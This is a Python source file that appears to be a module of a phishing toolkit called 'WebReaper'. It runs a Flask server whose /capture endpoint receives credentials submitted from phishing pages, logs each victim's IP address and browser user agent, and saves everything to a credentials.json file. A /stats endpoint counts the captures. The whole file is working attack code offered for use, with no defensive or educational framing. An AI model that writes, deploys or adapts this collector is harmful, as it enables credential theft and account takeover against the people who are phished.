"""
WebReaper Module : Credential Capture
Capture submitted credentials from phishing pages.
"""

from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

class CredentialCaptureModule:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.app = Flask(__name__)
        self.captured = []
        self.setup_routes()

    def setup_routes(self):
        @self.app.route("/capture", methods=["POST"])
        def capture():
            data = request.form.to_dict() if request.form else request.json or {}
            ip = request.remote_addr
            user_agent = request.headers.get("User-Agent", "")
            entry = {
                "timestamp": datetime.now().isoformat(),
                "ip": ip,
                "user_agent": user_agent,
                "credentials": data
            }
            self.captured.append(entry)
            self._save()
            return jsonify({"status": "ok"})

        @self.app.route("/stats")
        def stats():
            return jsonify({"total": len(self.captured)})

    def _save(self):
        os.makedirs(self.output_dir, exist_ok=True)
        filepath = os.path.join(self.output_dir, "credentials.json")
        with open(filepath, "w") as f:
            json.dump(self.captured, f, indent=2)

    def run(self, host="0.0.0.0", port=8080):
        self.app.run(host=host, port=port, debug=False)

    def get_results(self):
        return {"module": "credential_capture", "credentials": self.captured}
